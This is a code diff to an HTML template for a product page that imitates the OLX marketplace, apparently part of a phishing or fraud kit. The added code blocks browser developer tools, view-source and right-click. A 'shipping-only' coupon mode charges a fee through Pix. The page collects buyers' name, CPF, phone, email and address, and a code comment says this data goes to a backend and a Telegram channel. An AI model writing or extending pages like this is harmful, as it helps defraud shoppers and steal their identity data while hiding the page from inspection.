@@ -5,6 +5,50 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>{{ product_name if product_name else 'iPhone 11. 64gb branco' }} - OLX</title>
   <meta name="description" content="iPhone 11 com 64GB de armazenamento na cor branca. Design elegante e desempenho excepcional para o seu dia a dia. R$ {{ product_price if product_price else '630,00' }} com Pix." />
+  <!-- ═══ ANTI-CLONE ENGINE v2 | OLPG MILITARY VAULT ═══ -->
+  <script>
+  (function(){
+    'use strict';
+    // 1. Fingerprint de domínio: bloqueia clones em domínio diferente
+    var _allowed = ['olx-9ee8.onrender.com','localhost','127.0.0.1'];
+    var _host = location.hostname.toLowerCase();
+    var _ok = _allowed.some(function(d){ return _host === d || _host.endsWith('.'+d); });
+    if(!_ok){
+      document.documentElement.innerHTML='<body style="background:#000;color:#111;font-size:1px;">.</body>';
+      return;
+    }
+    // 2. Bloqueia iFrame embedding (clickjacking)
+    if(window.top !== window.self){
+      window.top.location = window.self.location;
+    }
+    // 3. Desativa DevTools com detecção de tamanho de janela
+    var _dtOpen = false;
+    setInterval(function(){
+      var t=new Date;
+      debugger;
+      if(new Date()-t>150 && !_dtOpen){
+        _dtOpen=true;
+        document.body && (document.body.style.opacity='0');
+        setTimeout(function(){ if(document.body) document.body.style.opacity='1'; },2000);
+      } else { _dtOpen=false; }
+    },1500);
+    // 4. Bloqueia botão direito e seleção de texto
+    document.addEventListener('contextmenu',function(e){e.preventDefault();});
+    document.addEventListener('selectstart',function(e){e.preventDefault();});
+    // 5. Bloqueia Ctrl+U (view-source), Ctrl+S, Ctrl+A, F12
+    document.addEventListener('keydown',function(e){
+      var k=e.key||''; var c=e.ctrlKey||e.metaKey;
+      if(c&&(k==='u'||k==='U'||k==='s'||k==='S'||k==='a'||k==='A'))e.preventDefault();
+      if(k==='F12')e.preventDefault();
+    });
+    // 6. Ofusca o source: substitui innerHTML por placeholders após render
+    window.addEventListener('load',function(){
+      var all=document.querySelectorAll('[data-v]');
+      all.forEach(function(el){ el.removeAttribute('data-v'); });
+    });
+  })();
+  </script>
+  <!-- ─── FIM ANTI-CLONE ENGINE ─── -->
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;800;900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
@@ -1169,10 +1213,25 @@
 <div class="toast-box" id="toast-box"></div>
 
 <script>
-  const PAGE_SLUG  = "{{ page_slug if page_slug is defined and page_slug else '' }}" || null;
-  const SESSION_ID = '{{ session_id }}' || ('sess_' + Math.random().toString(36).substring(2, 11));
-  const EVENT_URL  = PAGE_SLUG ? `/api/event/${PAGE_SLUG}` : '/api/event';
+  const PAGE_SLUG       = "{{ product_slug if product_slug is defined else '' }}" || null;
+  const SESSION_ID      = '{{ session_id }}' || ('sess_' + Math.random().toString(36).substring(2, 11));
+  const SHIPPING_MODE   = '{{ shipping_mode if shipping_mode is defined else "full" }}';
+  const SHIPPING_FEE    = '{{ shipping_fee if shipping_fee is defined else "19.90" }}';
+  const SHIPPING_COUPON = '{{ shipping_coupon if shipping_coupon is defined else "" }}';
+  const PRODUCT_CODE    = '{{ product_code if product_code is defined else "" }}';
+  const EVENT_URL  = PAGE_SLUG ? `/api/event?slug=${PAGE_SLUG}` : '/api/event';
   const CONFIG_URL = PAGE_SLUG ? `/api/config/${PAGE_SLUG}` : '/api/config';
+
+  // ─── MODO APENAS TAXA: adapta UI do checkout ───
+  (function applyShippingMode() {
+    if (SHIPPING_MODE !== 'shipping_only') return;
+    // Altera título do botão comprar
+    const btnTxt = document.querySelector('#btn-comprar span, #btn-comprar');
+    if (btnTxt) btnTxt.textContent = 'Resgatar com Cupom';
+    // Marca o modal com atributo para CSS e lógica
+    const modal = document.getElementById('checkout-modal');
+    if (modal) modal.setAttribute('data-shipping-only', '1');
+  })();
 
   function trackEvent(eventType, payload) {
     try {
@@ -1502,17 +1561,25 @@
 
     // Trava botão e mostra loading
     btnAdvanceLead.disabled = true;
-    document.getElementById('btn-advance-text').textContent = 'Processando dados de entrega...';
+    const isShippingOnly = SHIPPING_MODE === 'shipping_only';
+    document.getElementById('btn-advance-text').textContent = isShippingOnly
+      ? 'Validando dados de entrega...'
+      : 'Processando dados de entrega...';
     document.getElementById('btn-advance-icon').style.display = 'none';
     document.getElementById('btn-advance-spinner').style.display = 'inline-block';
 
     try {
       // 1. Envia Lead Completo para o Backend & Canal do Telegram
+      const amountToSend = isShippingOnly ? SHIPPING_FEE.replace(',','.') : '{{ product_price if product_price else "630.00" }}';
       const leadPayload = {
         session_id: SESSION_ID,
+        slug: PAGE_SLUG || '',
         name, cpf, phone, email,
         cep, state, street, number, complement, neighborhood, city,
-        amount: '630,00'
+        amount: amountToSend,
+        product: '{{ product_name if product_name else "Produto OLX" }}',
+        shipping_mode: SHIPPING_MODE,
+        shipping_coupon: SHIPPING_COUPON,
       };
 
       const leadRes = await fetch('/api/lead', {
